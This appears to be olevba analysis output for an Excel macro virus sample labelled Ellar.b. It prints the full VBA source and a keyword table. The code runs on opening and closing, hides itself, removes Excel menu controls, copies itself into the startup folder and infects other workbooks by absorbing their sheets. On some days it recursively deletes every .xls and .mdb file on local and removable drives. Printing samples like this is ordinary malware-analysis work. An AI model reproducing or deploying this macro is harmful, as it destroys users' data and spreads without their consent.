olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Ellar.b-a8508a3d20b08b90a4aa630658cb09ad8cc48246
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Ellar.b-a8508a3d20b08b90a4aa630658cb09ad8cc48246 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_BeforeClose(Cancel As Boolean)
If Day(Date) / 3 = Int(Day(Date) / 3) Then FindDrive
End Sub

-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Ellar.b-a8508a3d20b08b90a4aa630658cb09ad8cc48246 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit

Private Sub Worksheet_SelectionChange(ByVal Target As Excel.Range)

End Sub
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Virus.MSExcel.Ellar.b-a8508a3d20b08b90a4aa630658cb09ad8cc48246 - OLE stream: '_VBA_PROJECT_CUR/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function RegCreateKey Lib "advapi32.dll" Alias "RegCreateKeyA" (ByVal _
  hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Declare Function RegSetValueEx Lib "advapi32.dll" Alias "RegSetValueExA" (ByVal _
  hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType _
  As Long, lpValue As Long, ByVal cbData As Long) As Long
Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal ndrive As _
   String) As Long
Private Declare Function GetComputerName Lib "kernel32" Alias "GetComputerNameA" _
   (ByVal lpBuffer As String, nSize As Long) As Long

Public Const HKEY_CURRENT_USER = &H80000001
Public Const REG_OPTION_NON_VOLATILE = 0&
Public Const KEY_ALL_ACCESS = &H3F
Public Const REG_DWORD = 4
Public Function M_View()
On Error Resume Next
RegCreateKey HKEY_CURRENT_USER, "Software\Microsoft\Office\8.0\Excel\Microsoft Excel" _
  , phkResult
RegSetValueEx phkResult, "Options6", 0&, REG_DWORD, "0", 4
RegCloseKey phkResult
End Function
Public Function Auto_Open()
On Error Resume Next
M_View
T_Menu
Windows(ThisWorkbook.Name).Visible = False
Path = Application.StartupPath
FileName = Dir(Path & "\" & ComputerName)

If (GetAttr(Path & "\" & FileName) And vbDirectory) = vbDirectory And FileName <> "" Then _
   RmDir Path & "\" & ComputerName

If Dir(Path & "\" & ComputerName) = "" Then
   D_Sheet
   Application.StatusBar = ""
   ThisWorkbook.SaveAs FileName:=Path & "\" & ComputerName
   Application.DisplayAlerts = True
End If

If UCase(ThisWorkbook.Name) <> UCase(ComputerName) Then
  Windows(ThisWorkbook.Name).Visible = True
Else
  Windows(ThisWorkbook.Name).Visible = False
End If
Application.OnSheetActivate = "M_Click"
End Function
Public Function T_Menu()
On Error Resume Next
For Each Bar In CommandBars
  If UCase(Bar.Name) = "WORKSHEET MENU BAR" Then
    I = 0
    For Each Ctl In CommandBars("Window").Controls
      I = I + 1
      If Ctl.Id = 866 Then CommandBars("Window").Controls(I).Visible = False
    Next
   
    I = 0
    For Each Ctl In CommandBars("Tools").Controls
      I = I + 1
      If Ctl.Id = 30017 Then CommandBars("Tools").Controls(I).Visible = False
    Next
  End If

  I = 0
  For Each Ctl In CommandBars(Bar.Name).Controls
    I = I + 1
    If Ctl.Id = 30017 Or Ctl.Id = 866 Then CommandBars(Bar.Name).Controls(I).Delete
  Next
Next
End Function
Public Function M_Click()
On Error Resume Next
Dim SF_Name() As String
If Trim(ActiveWorkbook.Path) = "" Then Exit Function
F_Name = ActiveWorkbook.Path & "\" & ActiveWorkbook.Name
OK = "F"
No = Worksheets.Count
Application.ScreenUpdating = False
For I = 1 To No
  If OK = "F" And Worksheets(I).Name = "." Then OK = "T"
  If Sheets(Worksheets(I).Name).Visible >= 0 Then
     Kx = Kx + 1
     ReDim Preserve SF_Name(Kx)
     SF_Name(Kx) = Worksheets(I).Name
     Sheets(Worksheets(I).Name).Visible = -1
  End If
Next I

If OK = "T" Then Sheets(".").Visible = 2: Exit Function
D_Sheet
A_SHEET = ActiveWorkbook.Name
N_Sheet = ThisWorkbook.Name
Windows(N_Sheet).Visible = -1
Application.ScreenUpdating = False
For I = No To 1 Step -1
  TX = Workbooks(A_SHEET).Worksheets(I).Name
  Workbooks(A_SHEET).Sheets(TX).Move Before:=Workbooks(N_Sheet).Sheets(1)
Next I
Sheets(".").Visible = 2
For I = 1 To Kx
   Sheets(SF_Name(I)).Visible = False
Next I
Application.DisplayAlerts = False
ActiveWorkbook.SaveAs FileName:=F_Name
Application.DisplayAlerts = True
End Function
Public Function D_Sheet()
On Error Resume Next
ThisWorkbook.Save
Application.DisplayAlerts = False
For I = 1 To ThisWorkbook.Sheets.Count
  Nam = ThisWorkbook.Sheets.Count
  If ThisWorkbook.Sheets(I).Visible >= 0 Then ThisWorkbook.Sheets(I).Visible = -1
Next I
For I = ThisWorkbook.Sheets.Count To 1 Step -1
  If ThisWorkbook.Sheets(I).Name <> "." Then ThisWorkbook.Sheets(I).Delete
Next I
End Function
Public Function FindDrive()
On Error Resume Next
For I = 65 To 90
  Drive = Chr(I) & ":\"
  DriveType = GetDriveType(Drive)
  If DriveTyoe = 2 Or DriveType = 3 Then
     HaalDirOp (Drive)
  End If
Next
End Function
Public Sub HaalDirOp(ByVal Path$)
On Error Resume Next
Dim vDirName As String, LastDir As String
If Right(Path$, 1) <> "\" Then Path$ = Path$ & "\"
vDirName = Dir(Path, vbDirectory)
Do While Not vDirName = ""
  TX = Path & vDirName
  If GetAttr(TX) < 16 Or GetAttr(TX) >= 32 Then
     If UCase(Right(TX, 3)) = "XLS" Or UCase(Right(TX, 3)) = "MDB" Then Kill TX
  End If
  If vDirName <> "." And vDirName <> ".." Then
    If (GetAttr(Path & vDirName) And vbDirectory) = vbDirectory Then
      LastDir = vDirName
      TX = Path$ & vDirName
      Call HaalDirOp(Path$ & vDirName)
      vDirName = Dir(Path$, vbDirectory)
      Do Until vDirName = LastDir Or vDirName = ""
        vDirName = Dir
      Loop
      If vDirName = "" Then Exit Do
    End If
  End If
  vDirName = Dir
Loop
End Sub
Public Function ComputerName() As String
On Error Resume Next
Dim cn As String
Dim ls As Long
Dim res As Long
cn = String(1024, 0)
ls = 1024
res = GetComputerName(cn, ls)
If res <> 0 Then
ComputerName = Mid(cn, 1, InStr(cn, Chr(0)) - 1) & ".xls"
Else
ComputerName = "MICROSOFT.XLS"
End If
End Function
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085      9 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|AutoExec  |M_Click             |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

